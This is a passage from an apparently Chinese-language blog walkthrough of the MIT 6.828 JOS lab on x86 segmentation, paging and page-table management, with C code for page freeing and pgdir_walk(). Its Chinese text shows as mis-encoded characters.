(pp-&gt;pp_link)<br>panic(<span class="hljs-string">&quot;double free detected (pp_link)&quot;</span>);<br><br><span class="hljs-comment">// check validation by pp_ref</span><br><span class="hljs-keyword">if</span> (pp-&gt;pp_ref)<br>panic(<span class="hljs-string">&quot;cannot free a page in use!&quot;</span>);<br><br>pp-&gt;pp_link = page_free_list;<br>page_free_list = pp;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œ Exercise 1 å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥è¿›å…¥ Part2.</p><h2 id="Part-2-Virtual-Memory">Part 2: Virtual Memory</h2><p>ä¸€ä¸Šæ¥å°±æ˜¯ Exercise 2ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬äº†è§£ 80386 ä¸‹çš„<strong>åˆ†æ®µ</strong>å’Œ<strong>åˆ†é¡µ</strong></p><blockquote><p><strong>Exercise 2.</strong> Look at chapters 5 and 6 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a>, if you havenâ€™t done so already. Read the sections about page translation and page-based protection closely (5.2 and 6.4). We recommend that you also skim the sections about segmentation; while JOS uses the paging hardware for virtual memory and protection, segment translation and segment-based protection cannot be disabled on the x86, so you will need a basic understanding of it.</p></blockquote><p>åˆ†æ®µå¤§å®¶éƒ½æ‡‚ï¼Œå°±æ˜¯ä¸€ä¸ªæ®µå¯„å­˜å™¨é‡Œå­˜æ”¾æ®µé€‰æ‹©å­å¯¹åº”ä¸€ä¸ªæ®µæè¿°ç¬¦è¡¨ç¤ºä¸€å—è¿ç»­çš„å†…å­˜ç§°ä¸ºä¸€ä¸ªsegmentï¼Œåˆ†é¡µåˆ™æ˜¯ä¾æ‰˜é¡µè¡¨è¿™ä¸€ç»“æ„å»ºç«‹èµ·è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€é—´çš„æ˜ å°„ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯è¯´æ˜åˆ†é¡µå‡ºç°ä»¥ååˆ†æ®µå°±è‡ªç„¶è€Œç„¶åœ°æ¶ˆå¤±äº†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œ<strong>åˆ†é¡µä¸åˆ†æ®µå…¶å®æ˜¯åŒæ—¶å­˜åœ¨çš„</strong>ï¼Œå› ä¸ºè¿™æ˜¯ç”±ç¡¬ä»¶ï¼ˆCPUï¼‰æä¾›çš„åŠŸèƒ½</p><p>ä¸‹å›¾æ˜¯ä¸€å¼ åˆ†é¡µä¸åˆ†æ®µç›¸ç»“åˆçš„é€»è¾‘åœ°å€åˆ°ç‰©ç†åœ°å€é—´è½¬æ¢çš„è¿‡ç¨‹</p><p><img src="https://s2.loli.net/2022/03/15/fYIXuTGWdMn7ViE.png" alt="image.png"></p><p>ç¬”è€…è¿™é‡Œå‚ç…§å…¶æä¾›çš„æ–‡æ¡£ç®€è¿°ä¸€ä¸‹åˆ†æ®µ+åˆ†é¡µä¸‹çš„åœ°å€ç¿»è¯‘</p><h4 id="Segment-Translation">Segment Translation</h4><p>è¿›å…¥ä¿æŠ¤æ¨¡å¼ä¹‹åï¼Œæ®µå¯„å­˜å™¨å¹¶æ²¡æœ‰å¼ƒç”¨ï¼Œä»ç„¶æ‰¿æ‹…ç€å…¶â€œæè¿°ä¸€ä¸ªå†…å­˜æ®µâ€çš„ä½œç”¨ï¼Œä½†ä»…æœ‰ 16 ä½çš„ã€æ•°é‡å°‘å¾—å¯æ€œçš„æ®µå¯„å­˜å™¨æ—©å·²æ— æ³•æ»¡è¶³äººä»¬çš„éœ€æ±‚ï¼Œå› æ­¤åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æ®µå¯„å­˜å™¨ä¸å†ç›´æ¥å­˜æ”¾æ®µçš„åŸºå€ï¼Œè€Œæ˜¯å­˜æ”¾ç€ã€Œæ®µé€‰æ‹©å­ã€ï¼ˆsegment selectorï¼‰â€”â€”çœŸæ­£çš„æ®µæè¿°ç¬¦ï¼ˆsegment descriptorï¼‰å­˜æ”¾åœ¨ä¸€ä¸ªåä¸ºã€Œæ®µæè¿°ç¬¦è¡¨ã€ï¼ˆsegment descriptor tableï¼‰çš„ä¸€å—è¿ç»­å†…å­˜ä¸Šï¼Œæ®µé€‰æ‹©å­ç”¨ä»¥æ ‡è¯†å¯¹åº”çš„æ®µæè¿°ç¬¦åœ¨æ®µæè¿°ç¬¦è¡¨ä¸­çš„ä¸‹æ ‡ä¸æ®µçš„æƒé™</p><p>å› æ­¤åœ¨è®¿é—®ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼ˆé€»è¾‘åœ°å€ï¼‰æ—¶é¦–å…ˆéœ€è¦é€šè¿‡æ®µæè¿°ç¬¦ç¿»è¯‘æˆå¯¹åº”çš„çº¿æ€§åœ°å€ï¼ˆè‹¥æœªå¼€å¯åˆ†é¡µåˆ™ç¿»è¯‘çš„ç»“æœä¾¿ç›´æ¥ä¸ºç‰©ç†åœ°å€ï¼‰</p><p><img src="https://s2.loli.net/2022/03/15/jhiSsfPoKgVyGdR.png" alt="image.png"></p><p>ä¸€ä¸ªæ®µæè¿°ç¬¦æœ‰ç€å¦‚ä¸‹ç»“æ„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>ç³»ç»Ÿæ®µ</strong>ä¸æ™®é€šçš„æ•°æ®æ®µå’Œä»£ç æ®µç­‰æ˜¯æœ‰äº›è®¸åŒºåˆ«çš„ï¼Œåè€…å°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æ™®é€šçš„æ®µï¼Œè€Œå‰è€…é€šå¸¸ç”¨äºè¡¨ç¤ºä¸­æ–­é—¨ã€é™·é˜±é—¨ã€è°ƒç”¨é—¨ç­‰</p><p><img src="https://s2.loli.net/2022/03/15/xhKpzoEHBXnVRk1.png" alt="image.png"></p><p>å½“ç„¶ï¼Œæ—¢ç„¶æ®µå¯„å­˜å™¨é‡Œå­˜æ”¾çš„å˜æˆäº†æ®µé€‰æ‹©å­ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶éœ€è¦ä¸€ä¸ªæ–°çš„ç»“æ„æ¥å¯¹åº”è¡¨ç¤ºæ®µæè¿°ç¬¦è¡¨çš„åœ°å€ï¼Œæ®µæè¿°ç¬¦è¡¨åˆ†ä¸ºä¸¤ç§â€”â€”å…¨å±€æ®µæè¿°ç¬¦è¡¨ä¸å±€éƒ¨æ®µæè¿°ç¬¦è¡¨ï¼Œå› è€Œé¡µå¼•å…¥äº†ä¸¤ä¸ªæ–°çš„å¯„å­˜å™¨â€”â€”GDTR ä¸ LDTR</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…¨å±€æ®µæè¿°ç¬¦è¡¨çš„ç¬¬ä¸€ä¸ªæ®µæè¿°ç¬¦ä¸º<strong>ä¸å¯ç”¨çš„æ®µæè¿°ç¬¦</strong></p><p><img src="https://s2.loli.net/2022/03/15/izYW8Dp7feT1wNE.png" alt="image.png"></p><p>æœ€åæˆ‘ä»¬æ¥çœ‹æ®µå¯„å­˜å™¨ä¸­å­˜æ”¾çš„æ®µé€‰æ‹©å­ï¼Œç»“æ„è¾ƒä¸ºç®€å•ï¼Œä¸»è¦å°±æ˜¯å­˜æ”¾äº†å¯¹åº”çš„æ®µæè¿°ç¬¦åœ¨æ®µæè¿°ç¬¦è¡¨ä¸­çš„ä¸‹æ ‡ã€è®¿é—®æƒé™ã€å¯¹åº”ä½äºå…¨å±€/å±€éƒ¨æ®µæè¿°ç¬¦è¡¨</p><p><img src="https://s2.loli.net/2022/03/15/74PQFlKoHqLbsyW.png" alt="image.png"></p><blockquote><p>å…³äºåˆ†æ®µæœºåˆ¶ï¼Œæ›´è¯¦ç»†æ·±å…¥çš„è¯´æ˜å‚è§ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89</a></p></blockquote><h4 id="Page-Translation">Page Translation</h4><p>è®²å®Œäº†åˆ†æ®µæœºåˆ¶ï¼Œæ¥ä¸‹æ¥åˆ°åˆ†é¡µæœºåˆ¶ï¼Œåˆ†é¡µæœºåˆ¶å°†ç‰©ç†å†…å­˜ä»¥ã€Œé¡µã€ä¸ºç²’åº¦è¿›è¡Œç®¡ç†ï¼Œé€šè¿‡ã€Œé¡µè¡¨ã€è¿™ä¸€æ•°æ®ç»“æ„å®Œæˆçº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„</p><p>åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ˜¯å¦å¼€å¯åˆ†é¡µæ˜¯é€šè¿‡ Cr0 å¯„å­˜å™¨çš„ PG ä½æ ‡è¯†çš„ï¼Œ<strong>ä½†æ˜¯åˆ†æ®µæ˜¯é»˜è®¤å¼€å¯çš„</strong>ï¼Œæ€ä¹ˆå¤„ç†åˆ†æ®µä¸åˆ†é¡µä¹‹é—´çš„å†²çªå‘¢ï¼Ÿç¬”è€…è®¤ä¸ºå¯ä»¥è¿™ä¹ˆç†è§£ï¼š<strong>åœ¨å¼€å¯åˆ†é¡µä¹‹å‰ï¼Œåˆ†æ®µæ˜¯ç›´æ¥å¯¹ç‰©ç†åœ°å€ç©ºé—´è¿›è¡Œåˆ†æ®µï¼›åœ¨å¼€å¯åˆ†é¡µä¹‹åï¼Œåˆ†æ®µæ˜¯å¯¹é¡µè¡¨æ˜ å°„åçš„çº¿æ€§åœ°å€ç©ºé—´è¿›è¡Œåˆ†æ®µ</strong>ï¼Œç›¸å½“äºæ˜¯åœ¨åˆ†æ®µä¸ç‰©ç†åœ°å€ä¹‹é—´æ’å…¥äº†ä¸€ä¸ªä¸­é—´å±‚</p><p>äºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹ 32 ä½ä¸‹å¯ç”¨äºŒçº§é¡µè¡¨çš„åˆ†é¡µæœºåˆ¶ï¼Œåœ¨åˆ†é¡µæœºåˆ¶ä¸‹ä¸€ä¸ª 32 ä½çš„çº¿æ€§åœ°å€æœ‰ç€è¿™æ ·çš„ä¸‰æ®µå¼ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/03/15/3pScjrUCxOkwJA7.png" alt="image.png"></p><p>åœ¨ Cr3 å¯„å­˜å™¨ä¸­å­˜æ”¾ç€é¡µç›®å½•è¡¨çš„åœ°å€ï¼›MMUåœ¨å°†ä¸€ä¸ªçº¿æ€§åœ°å€ç¿»è¯‘æˆç‰©ç†åœ°å€æ—¶ï¼Œé¦–å…ˆé€šè¿‡ Cr3 å¯„å­˜å™¨è·å–åˆ°é¡µç›®å½•è¡¨åœ°å€ï¼Œé€šè¿‡çº¿æ€§åœ°å€çš„ DIR åŸŸæ‰¾åˆ°é¡µç›®å½•è¡¨å¯¹åº”ä¸‹æ ‡çš„é¡µç›®å½•è¡¨é¡¹ï¼ˆPage Directory Entryï¼‰ï¼Œé¡µç›®å½•è¡¨é¡¹ä¸­å­˜æ”¾ç€å¯¹åº”çš„é¡µè¡¨çš„åœ°å€ï¼Œå†é€šè¿‡çº¿æ€§åœ°å€çš„ PAGE åŸŸæ‰¾åˆ°é¡µè¡¨å¯¹åº”ä¸‹æ ‡çš„é¡µè¡¨é¡¹ï¼ˆPage Table Entryï¼‰ï¼Œé¡µè¡¨é¡¹ä¸­å­˜æ”¾ç€å¯¹åº”çš„ç‰©ç†é¡µåœ°å€ï¼Œæœ€åé€šè¿‡ OFFSET åŸŸï¼ˆå³é¡µå†…åç§»ï¼‰è®¿é—®åˆ°å¯¹åº”ç‰©ç†é¡µçš„å¯¹åº”æ•°æ®</p><p><img src="https://s2.loli.net/2022/03/15/bnYKURW1xPg7CHN.png" alt="image.png"></p><p>ä¸€ä¸ªé¡µï¼ˆç›®å½•ï¼‰è¡¨é¡¹æœ‰ç€å¦‚ä¸‹çš„ç»“æ„ï¼Œç”±äºé¡µç›®å½•è¡¨ã€é¡µè¡¨ã€ç‰©ç†é¡µéƒ½æ˜¯ä»¥é¡µä¸ºå•ä½å¯¹é½çš„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å­˜æ”¾ä»¥é¡µä¸ºå•ä½çš„åœ°å€å³å¯ï¼Œç©ºé—²ä¸‹æ¥çš„è¿™äº›ä½è¢«ç”¨ä»¥å­˜æ”¾é¡µè®¿é—®ã€è¯»å†™æƒé™ç­‰</p><p><img src="https://s2.loli.net/2022/03/15/begX4uJNymUs92a.png" alt="image.png"></p><h3 id="Virtual-Linear-and-Physical-Addresses">Virtual, Linear, and Physical Addresses</h3><p>æˆ‘ä»¬ç°åœ¨æ­£å¼å¯¹ä¸€å †å„ç§åœ°å€åè¯ä¸‹å®šä¹‰ï¼š</p><ul><li>ã€Œè™šæ‹Ÿåœ°å€ã€ï¼šåŸºäºåˆ†æ®µæœºåˆ¶è¡¨ç¤ºçš„åœ°å€ï¼Œç”±ä¸€ä¸ªæ®µé€‰æ‹©å­ä¸æ®µå†…åç§»ç»„æˆ</li><li>ã€Œçº¿æ€§åœ°å€ã€ï¼šåŸºäºåˆ†é¡µæœºåˆ¶è¡¨ç¤ºçš„åœ°å€ï¼Œæ˜¯ç»è¿‡äº†åˆ†æ®µç¿»è¯‘åçš„ä¸€ä¸ªåœ°å€</li><li>ã€Œç‰©ç†åœ°å€ã€ï¼šRAM ä¸Šçš„çœŸå®åœ°å€</li></ul><p>å¾—åˆ°å¦‚ä¸‹è½¬æ¢å›¾ä¾‹ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">           Selector  +--------------+         +-----------+<br>          ----------&gt;|<span class="hljs-string">              </span>|<span class="hljs-string">         </span>|<span class="hljs-string">           </span>|<br>                     |<span class="hljs-string"> Segmentation </span>|<span class="hljs-string">         </span>|<span class="hljs-string">  Paging   </span>|<br>Software             |<span class="hljs-string">              </span>|<span class="hljs-string">--------&gt;</span>|<span class="hljs-string">           </span>|<span class="hljs-string">----------&gt;  RAM</span><br><span class="hljs-string">            Offset   </span>|<span class="hljs-string">  Mechanism   </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> Mechanism </span>|<br>          ----------&gt;|<span class="hljs-string">              </span>|<span class="hljs-string">         </span>|<span class="hljs-string">           </span>|<br>                     +--------------+         +-----------+<br>            Virtual                   Linear                Physical<br></code></pre></td></tr></table></figure><p>å…¶å®åœ¨åˆ†é¡µæœºåˆ¶å‡ºç°ä¹‹åï¼Œåˆ†æ®µæœºåˆ¶å°±æ²¡æœ‰ä»€ä¹ˆå­˜åœ¨çš„æ„ä¹‰äº†ï¼Œå› æ­¤ä½ å¯ä»¥çœ‹åˆ°ç°ä»£æ“ä½œç³»ç»ŸåŸºæœ¬ä¸Šéƒ½å¾ˆå°‘æåˆ†æ®µçš„æ¦‚å¿µï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹è™šæ‹Ÿåœ°å€å°±ç›´æ¥æ˜¯çº¿æ€§åœ°å€ï¼ˆå½“ç„¶ï¼Œå…¶å®è¿˜æ˜¯æœ‰ä¸€äº›åœ°æ–¹ç”¨åˆ°åˆ†æ®µçš„æƒé™éªŒè¯ç­‰ç‰¹æ€§çš„ï¼‰</p><p>åŒæ ·åœ°ï¼Œä¸ºäº†ç®€åŒ–åœ°å€ç¿»è¯‘çš„æ“ä½œï¼Œåœ¨ <code>boot/boot.S</code> ä¸­ JOS <strong>åˆå§‹åŒ–äº†ä¸€ä¸ªæ‰€æœ‰çš„æ®µæè¿°ç¬¦éƒ½å¯¹åº”æ®µåŸºå€ 0ã€æ®µç•Œé™ 0xffffffff çš„å…¨å±€æ®µæè¿°ç¬¦è¡¨</strong>ï¼Œè¿™æ ·è™šæ‹Ÿåœ°å€å®é™…ä¸Šå°±ç›´æ¥æ˜¯çº¿æ€§åœ°å€äº†</p><p>ä¸‹é¢æ¥çœ‹ Exercise 3ï¼Œä¸»è¦è®©æˆ‘ä»¬ç†Ÿæ‚‰ Qemu æä¾›çš„ä¸€äº›æŸ¥çœ‹å†…å­˜çš„æŒ‡ä»¤</p><blockquote><p><strong>Exercise 3.</strong> While GDB can only access QEMUâ€™s memory by virtual address, itâ€™s often useful to be able to inspect physical memory while setting up virtual memory. Review the QEMU <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html#qemu">monitor commands</a> from the lab tools guide, especially the <code>xp</code> command, which lets you inspect physical memory. To access the QEMU monitor, press Ctrl-a c in the terminal (the same binding returns to the serial console).</p><p>Use the xp command in the QEMU monitor and the x command in GDB to inspect memory at corresponding physical and virtual addresses and make sure you see the same data.</p><p>Our patched version of QEMU provides an info pg command that may also prove useful: it shows a compact but detailed representation of the current page tables, including all mapped memory ranges, permissions, and flags. Stock QEMU also provides an info mem command that shows an overview of which ranges of virtual addresses are mapped and with what permissions.</p></blockquote><p>å…ˆæŒ‰ <code>Ctrl + A</code>ï¼Œç„¶åå†æŒ‰ <code>C</code>ï¼Œè¿›å…¥ Qemu çš„ monitor æ¨¡å¼ï¼Œä½¿ç”¨ <code>info pg</code> æŒ‡ä»¤æŸ¥çœ‹åˆ†é¡µæ˜ å°„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/03/15/FlrKz6RbmSIBQf4.png" alt="image.png"></p><p>ä½¿ç”¨ <code>xp</code> å‘½ä»¤æŸ¥çœ‹å¯¹åº”ç‰©ç†å†…å­˜ä¸Šæ•°æ®ä¸ä¸¤ä¸ªæ˜ å°„çš„è™šæ‹Ÿåœ°å€ä¸Šæ•°æ®ï¼Œå®Œå…¨ä¸€è‡´</p><p><img src="https://s2.loli.net/2022/03/15/hupwIHRkyqefoD3.png" alt="image.png"></p><p>æœ€åæ˜¯ <code>info mem</code> æŸ¥çœ‹åœ°å€ç©ºé—´æƒé™ï¼Œè™šæ‹Ÿåœ°å€ç©ºé—´èµ·å§‹ 4MB ä»…ä¸ºå¯è¯»æƒé™ï¼Œä½äºè™šæ‹Ÿåœ°å€é«˜ 256MB çš„èµ·å§‹ 4MB ä¸ºå¯è¯»å†™æƒé™ï¼Œ<strong>ä½†å®é™…ä¸Šå¯¹åº”çš„éƒ½æ˜¯åŒä¸€å—ç‰©ç†åœ°å€ç©ºé—´</strong></p><p><img src="https://s2.loli.net/2022/03/15/N8nMTkh6Pgqlj5m.png" alt="image.png"></p><p>ç»§ç»­å¾€ä¸‹ï¼Œåœ¨ JOS ä¸­å®šä¹‰äº†ä¸¤ä¸ª <code>uint32_t</code> çš„åˆ«å <code>uintptr_t</code> ä¸ <code>physaddr_t</code> è¡¨ç¤ºè™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ï¼ˆåœ¨ç¼–è¯‘å™¨çœ‹æ¥å…¶å®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼‰</p><table><thead><tr><th>C type</th><th>Address type</th></tr></thead><tbody><tr><td><code>T*</code></td><td>Virtual</td></tr><tr><td><code>uintptr_t</code></td><td>Virtual</td></tr><tr><td><code>physaddr_t</code></td><td>Physical</td></tr></tbody></table><p>æ¥ä¸‹æ¥æ˜¯ MIT 6.828 çš„ä¸€ä¸ªå°ä¹ é¢˜ï¼š</p><blockquote><p><strong>Question</strong></p><ol><li>Assuming that the following JOS kernel code is correct, what type should variable <code>x</code> have, <code>uintptr_t</code> or <code>physaddr_t</code>?</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mystery_t x<span class="hljs-comment">;</span><br>char* value <span class="hljs-operator">=</span> return_a_pointer()<span class="hljs-comment">;</span><br>*value <span class="hljs-operator">=</span> <span class="hljs-number">10</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> (mystery_t) value<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬çŸ¥é“è™šæ‹Ÿåœ°å€æ˜¯å¯ä»¥é€šè¿‡ MMU è¿›è¡Œç¿»è¯‘è®¿é—®åˆ°ç‰©ç†åœ°å€çš„ï¼Œä½†æ˜¯ä¸€ä¸ªç‰©ç†åœ°å€ç»è¿‡ MMU ä¹‹åå¾—åˆ°çš„å¯èƒ½æ˜¯å¥‡å½¢æ€ªçŠ¶çš„ä¸œè¥¿ï¼ˆæ¯”å¦‚è¯´ç‰©ç†åœ°å€åŒå€¼çš„è™šæ‹Ÿåœ°å€å·²ç»å»ºç«‹äº†ä¸€ä¸ªæ˜ å°„ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œçš„ x åº”å½“æ˜¯ <code>uintptr_t</code> ç±»å‹</p><h3 id="Reference-counting">Reference counting</h3><p>åœ¨ç”¨ä»¥è¡¨ç¤ºå•ä¸ªç‰©ç†é¡µæ¡†çš„ <code>PageInfo</code> ç»“æ„ä½“ä¸­çš„æˆå‘˜ <code>pp_ref</code> ç”¨ä»¥è¡¨ç¤ºä¸€å¼ é¡µé¢è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼ˆå¼•ç”¨è®¡æ•°ï¼‰ï¼Œå¼•ç”¨è®¡æ•°ä¸º 0 æ—¶è¡¨ç¤ºè¯¥é¡µä¸ºç©ºé—²é¡µï¼Œä½†æ˜¯å¼•ç”¨è®¡æ•°çš„å¢/å‡<strong>åº”å½“ç”±ä½¿ç”¨è€…å®Œæˆ</strong>ï¼Œå› æ­¤åœ¨æˆ‘ä»¬è°ƒç”¨ <code>page_alloc()</code> ä¹‹ååº”å½“ç«‹å³å°†å¼•ç”¨è®¡æ•° + 1ï¼Œè€Œå½“å¼•ç”¨è®¡æ•°ä¸º 0 æ—¶æˆ‘ä»¬æ‰åº”å½“è°ƒç”¨ <code>page_free()</code> é‡Šæ”¾ä¸€å¼ å†…å­˜é¡µ</p><blockquote><p>æœ€åè¿™ä¸ªå·¥ä½œ JOS å½’å¹¶åœ¨ <code>page_decref()</code> ä¸­å®Œæˆ</p></blockquote><h3 id="Page-Table-Management">Page Table Management</h3><p>æ¥ä¸‹æ¥æ˜¯ Exercise4ï¼Œè®©æˆ‘ä»¬å®Œæˆå¯¹é¡µè¡¨çš„ç®¡ç†ï¼Œè¡¥å…¨å¯¹åº”å‡½æ•°</p><blockquote><p><strong>Exercise 4.</strong> In the file <code>kern/pmap.c</code>, you must implement code for the following functions.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pgdir_walk</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">boot_map_region</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_lookup</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_remove</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_insert</span><span class="hljs-params">()</span></span><br><br></code></pre></td></tr></table></figure><p><code>check_page()</code>, called from <code>mem_init()</code>, tests your page table management routines. You should make sure it reports success before proceeding.</p></blockquote><h4 id="pgdir-walk-ï¼šï¼ˆåˆ›å»ºå¹¶ï¼‰è¿”å›-PTE">pgdir_walk()ï¼šï¼ˆåˆ›å»ºå¹¶ï¼‰è¿”å› PTE</h4><p>æŒ‰æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œå¯¹äºä¸€ä¸ªç»™å®šçš„é¡µç›®å½•è¡¨åœ°å€ä¸ä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œè¯¥å‡½æ•°åº”å½“è¿”å›å¯¹åº”çš„ã€Œé¡µè¡¨é¡¹ã€çš„åœ°å€ï¼Œè‹¥å¯¹åº”çš„é¡µè¡¨ä¸ºç©ºä¸”æŒ‡å®šäº† <code>create</code> æ ‡å¿—ä½ï¼Œåˆ™åˆ†é…ä¸€å¼ æ–°çš„ç‰©ç†é¡µä½œä¸ºæ–°çš„é¡µè¡¨ï¼Œè‹¥å¦ã€æˆ–æ˜¯åˆ†é…ç‰©ç†é¡µå¤±è´¥åˆ™ç›´æ¥è¿”å› NULLï¼›åˆ†é…æˆåŠŸååº”å½“å¢åŠ è¯¥é¡µçš„å¼•ç”¨è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Given &#x27;pgdir&#x27;, a pointer to a page directory, pgdir_walk returns</span><br><span class="hljs-comment">// a pointer to the page table entry (PTE) for linear address &#x27;va&#x27;.</span><br><span class="hljs-comment">// This requires walking the two-level page table structure.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The relevant page table page might not exist yet.</span><br><span class="hljs-comment">// If this is true, and create == false, then pgdir_walk returns NULL.</span><br><span class="hljs-comment">// Otherwise, pgdir_walk allocates a new page table page with page_alloc.</span><br><span class="hljs-comment">//    - If the allocation fails, pgdir_walk returns NULL.</span><br><span class="hljs-comment">//    - Otherwise, the new page&#x27;s reference count is incremented,</span><br><span class="hljs-comment">//the page is cleared,</span><br><span class="hljs-comment">//and pgdir_walk returns a pointer into the new page table page.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 1: you can turn a PageInfo * into the physical address of the</span><br><span class="hljs-comment">// page it refers to with page2pa() from kern/pmap.h.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 2: the x86 MMU checks permission bits in both the page directory</span><br><span class="hljs-comment">// and the page table, so it&#x27;s safe to leave permissions in the page</span><br><span class="hljs-comment">// directory more permissive than strictly necessary.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 3: look at inc/mmu.h for useful macros that manipulate page</span><br><span class="hljs-comment">// table and page directory entries.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>å‚ç…§æºç å…¶ä»–åœ°æ–¹çš„ç›¸å…³å†™æ³•ï¼Œåˆ©ç”¨ JOS æä¾›çš„ä¸€äº›å®å¾ˆå®¹æ˜“å°±èƒ½è¡¥å®Œè¯¥å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pte_t</span> *<br><span class="hljs-title function_">pgdir_walk</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *va, <span class="hljs-type">int</span> create)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">int</span> pde_idx;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">new_page_table_page</span>;</span><br><span class="hljs-type">pte_t</span> *page_table;<br><br><span class="hljs-keyword">if</span> (!pgdir)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// create page table if not exist</span><br>pde_idx = PDX(va);<br><span class="hljs-keyword">if</span> (!pgdir[pde_idx] || !(pgdir[pde_idx] &amp; PTE_P))<br>&#123;<br><span class="hljs-keyword">if</span> (create)<br>&#123;<br>new_page_table_page = page_alloc(ALLOC_ZERO);<br><span class="hljs-keyword">if</span> (!new_page_table_page)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>new_page_table_page-&gt;pp_ref++;<br>pgdir[pde_idx] = (<span class="hljs-type">pde_t</span>) (page2pa(new_page_table_page) | PTE_P | PTE_W | PTE_U);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// align to PGSIZE</span><br>page_table = 